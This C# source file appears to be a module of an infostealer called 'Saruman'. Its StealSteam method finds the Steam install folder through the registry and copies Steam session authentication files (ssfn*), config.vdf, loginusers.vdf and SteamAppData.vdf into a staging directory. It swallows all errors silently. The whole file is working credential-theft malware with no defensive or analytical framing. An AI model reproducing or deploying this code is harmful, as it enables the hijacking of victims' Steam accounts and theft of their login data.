﻿using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Saruman.Utilies.App
{
    class Steam
    {
        public static object Identifier { get; private set; }

        public static void StealSteam(string dir)
        {
            try
            {
                Directory.CreateDirectory(dir + "\\Apps\\Steam");
                string text = Path.Combine(dir, "Apps\\Steam");
                object value = Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Valve\\Steam", "Steampath", null);
                if (value == null)
                {
                   
                }
                else
                {
                    string text2 = value.ToString();
                    StringBuilder stringBuilder = new StringBuilder();
                    string empty = string.Empty;
                    string text3 = text2;
                    for (int i = 0; i < text3.Length; i++)
                    {
                        char value2 = text3[i];
                        if (value2.Equals('/'))
                        {
                            stringBuilder.Append("\\");
                        }
                        else
                        {
                            stringBuilder.Append(value2);
                        }
                    }
                    empty = stringBuilder.ToString();
                    if (!Directory.Exists(empty))
                    {
                      
                    }
                    else
                    {
                        Directory.CreateDirectory(text);
                        string[] files = Directory.GetFiles(empty, "ssfn*");
                        string[] array = files;
                        foreach (string text4 in array)
                        {
                            string fileName = Path.GetFileName(text4);
                            File.Copy(text4, Path.Combine(text, fileName), overwrite: true);
                        }
                        if (File.Exists(empty + "\\config\\config.vdf"))
                        {
                            File.Copy(empty + "\\config\\config.vdf", text + "\\config.vdf");
                        }
                        if (File.Exists(empty + "\\config\\loginusers.vdf"))
                        {
                            File.Copy(empty + "\\config\\loginusers.vdf", text + "\\loginusers.vdf");
                        }
                        if (File.Exists(empty + "\\config\\SteamAppData.vdf"))
                        {
                            File.Copy(empty + "\\config\\SteamAppData.vdf", text + "\\SteamAppData.vdf");
                        }
                        
                    }
                }
            }
            catch (Exception item)
            {

               
            }
        }
    }
}
